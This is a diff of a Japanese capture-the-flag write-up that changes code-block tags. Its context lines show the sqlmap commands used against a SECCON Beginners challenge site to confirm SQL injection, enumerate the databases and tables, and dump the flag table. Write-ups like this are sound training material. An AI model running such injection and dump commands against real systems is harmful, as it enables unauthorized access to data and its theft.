@@ -64,7 +64,7 @@ vm = new Vue({
 
 `SQL Injection`は[sqlmap](https://github.com/sqlmapproject/sqlmap)で確認できる
 
-```bash
+```plain
 $ sqlmap -u "http://goods.chall.beginners.seccon.jp/items.php?minstock=0"
         ___
        __H__
@@ -130,7 +130,7 @@ back-end DBMS: MySQL >= 5.0.12
 
 次にどんなデータベースがあるかを調べる
 
-```bash
+```plain
 $ sqlmap -u "http://goods.chall.beginners.seccon.jp/items.php?minstock=0" --dbs
         ___
        __H__
@@ -177,7 +177,7 @@ available databases [2]:
 
 `app`にあるテーブルをみてみる
 
-```bash
+```plain
 $ sqlmap -u "http://goods.chall.beginners.seccon.jp/items.php?minstock=0" --tables -D "app"
         ___
        __H__
@@ -227,7 +227,7 @@ Database: app
 
 中をみてみよう
 
-```bash
+```plain
 $ sqlmap -u "http://goods.chall.beginners.seccon.jp/items.php?minstock=0" --dump -D "app" -T "flag"
         ___
        __H__
